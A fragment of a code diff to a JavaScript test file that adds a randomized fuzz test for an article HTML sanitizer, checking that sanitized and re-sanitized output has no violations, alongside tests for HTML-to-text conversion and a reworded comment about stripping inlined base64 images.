+      s += `${pick(FUZZ_SEPS)}${pick(FUZZ_ATTRS)}${v === "" ? "" : `${pick(["=", " = "])}${v}`}`;
+    }
+    s += pick([">", "/>", " >", "", ">>", "<"]);
+    if (rand() < 0.5) s += `${pick(FUZZ_TEXT)}</${name}>`;
+    return s;
+  };
+  for (let round = 0; round < 2000; round += 1) {
+    let html = "";
+    for (let i = 0, n = 1 + Math.floor(rand() * 4); i < n; i += 1) {
+      html += rand() < 0.8 ? tag() : pick(FUZZ_TEXT);
+    }
+    const out = sanitizeArticleHtml(html);
+    const bad = await violations(out);
+    if (bad.length > 0) throw new Error(`${JSON.stringify(html)} -> ${JSON.stringify(out)}: ${bad.join(", ")}`);
+    const again = await violations(sanitizeArticleHtml(out));
+    if (again.length > 0) throw new Error(`re-sanitizing ${JSON.stringify(out)}: ${again.join(", ")}`);
+  }
+  expect(true).toBe(true);
+});
+
+// --- htmlToText / stripDataImages -------------------------------------------
 
 test("htmlToText turns blocks into breaks and decodes entities", () => {
   const t = htmlToText(`<h1>Title</h1><p>a &amp; b</p><p>c</p>`);
   expect(t).toBe("Title\n\na & b\n\nc");
 });
 
-// --- stripDataImages --------------------------------------------------------
-// Run on both bodies that travel: the published briefing bodies and a kept
-// article. An inlined image outweighs the article it illustrates; an external
-// one is a URL, and the reading end renders it through the img: proxy.
+// stripDataImages runs on both bodies that travel: the published briefing
+// bodies and a kept article. An inlined image outweighs the article it
+// illustrates; an external one is a URL, and the reading end renders it through
+// the img: proxy.
 
 test("stripDataImages drops inlined base64 images, tag and all", () => {
   const html =
